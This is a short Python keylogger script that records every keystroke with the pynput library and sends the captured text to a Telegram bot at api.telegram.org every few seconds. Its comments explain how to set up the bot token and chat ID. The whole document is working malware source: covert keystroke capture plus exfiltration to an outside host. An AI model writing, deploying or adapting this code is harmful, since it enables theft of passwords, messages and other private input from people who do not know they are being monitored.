from pynput import keyboard
import time, threading, requests

data = ''
def log(key): #capture the keys and append it into data
    global data
    data = data + '['+str(key)+']'

def send_log(): 
#we need to run this func also at the same time with log, so need to use multithreading.
# what this func do is wait for 10 sec and send whatever in data is and then empty the data again
    while True:
        global data
        time.sleep(5)
        if data != '':
            url = f"https://api.telegram.org/<YOUR_BOT_TOKEN>/sendMessage?chat_id=<YOUR_CHAT_ID>&text={data}"
            # create a Telegram bot using BOT FATHER and add your token and chat ID above (ignore angular brackets <>) 
            requests.get(url)
        data = ''

key_thread = threading.Thread(target=send_log)
key_thread.start()
listner = keyboard.Listener(on_press=log)
with listner:
    listner.join()
